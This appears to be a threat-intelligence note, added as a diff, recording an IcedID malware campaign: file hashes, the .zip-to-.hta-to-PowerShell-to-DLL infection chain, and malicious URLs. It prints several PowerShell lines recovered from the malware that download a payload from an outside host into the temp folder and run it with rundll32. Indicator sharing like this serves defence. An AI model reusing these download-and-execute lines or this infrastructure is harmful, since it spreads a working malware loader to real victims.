@@ -1,0 +1,24 @@
+IcedID - 09/02/2022 
+
+***************************************
+
+.hta 559f3340e547fa3f928fe5035045aff87e9ba21f7cf74df11484a6d9029e94c7
+
+.zip > .hta > .ps1 > .dll 
+
+.dll b8d794f6449669ff2d11bc635490d9efdd1f4e92fcb3be5cdb4b40e4470c0982
+
+https://funciabi.com/insur.php?/
+
+.ps1
+
+$path = $Env:temp+'\AlGrHQWimpgc.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://a24b.com/bc/support.php',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer
+$path = $Env:temp+'\gOBdKtbjw.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://a24b.com/bc/support.php',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer 
+$path = $Env:temp+'\bXROUoZpN.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://a24b.com/bc/support.php',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer
+$path = $Env:temp+'\JlpwAYgcs.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://a24b.com/bc/support.php',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer
+$path = $Env:temp+'\KcLTCIObEkBj.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://a24b.com/bc/support.php',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer
+
+.dll drop
+
+https://a24b.com/bc/support.php?/YZdcXtfvSDx.bin
+
